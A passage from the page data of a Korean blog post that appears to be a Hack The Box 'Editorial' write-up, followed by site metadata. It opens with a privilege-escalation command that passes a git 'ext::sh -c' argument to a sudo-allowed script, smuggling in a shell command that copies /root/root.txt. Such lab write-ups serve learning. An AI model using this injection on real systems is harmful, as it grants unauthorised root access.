/opt/internal_apps/clone_changes/clone_prod_change.py <span class=\"token string\">'ext::sh -c cat% /root/root.txt% >% /tmp/root'</span></code></pre></div>\n<p><img src=\"https://velog.velcdn.com/images/h3llanut3lla/post/1e3ee081-6a2c-4fd1-b7d1-ed60143190c5/image.png\"></p>\n<p>이렇게 <code class=\"language-text\">sudo</code>와 함께 상위 명령어를 입력하면 하면 루트로 권한 상승을 할 수 있다. </p>","frontmatter":{"title":"Editorial","date":"February 08, 2025","update":"February 08, 2025","tags":["HTB","SSRF","git","sudo-l","SSH","리눅스"],"series":null},"fields":{"slug":"/Editorial/","readingTime":{"minutes":7.61}}},"seriesList":{"edges":[{"node":{"id":"11b1c1ba-0892-55bb-a8b4-12725a60634b","fields":{"slug":"/Broker/"},"frontmatter":{"title":"Broker"}}},{"node":{"id":"2de10886-d77d-5ae4-8d82-3c252f0872e9","fields":{"slug":"/Editorial/"},"frontmatter":{"title":"Editorial"}}},{"node":{"id":"78bc815d-f444-5efc-8f0f-c75019292655","fields":{"slug":"/Sauna/"},"frontmatter":{"title":"Sauna"}}},{"node":{"id":"f3e63794-05fc-5137-8062-c9a4261c6ff5","fields":{"slug":"/Timelapse/"},"frontmatter":{"title":"Timelapse"}}},{"node":{"id":"e8b68538-12a5-5e25-b0aa-d336c2072f24","fields":{"slug":"/about/"},"frontmatter":{"title":"안녕하세요"}}}]},"previous":{"fields":{"slug":"/Broker/"},"frontmatter":{"title":"Broker"}},"next":{"fields":{"slug":"/Sauna/"},"frontmatter":{"title":"Sauna"}}},"pageContext":{"id":"2de10886-d77d-5ae4-8d82-3c252f0872e9","series":null,"previousPostId":"11b1c1ba-0892-55bb-a8b4-12725a60634b","nextPostId":"78bc815d-f444-5efc-8f0f-c75019292655"}},"staticQueryHashes":[],"slicesMap":{}}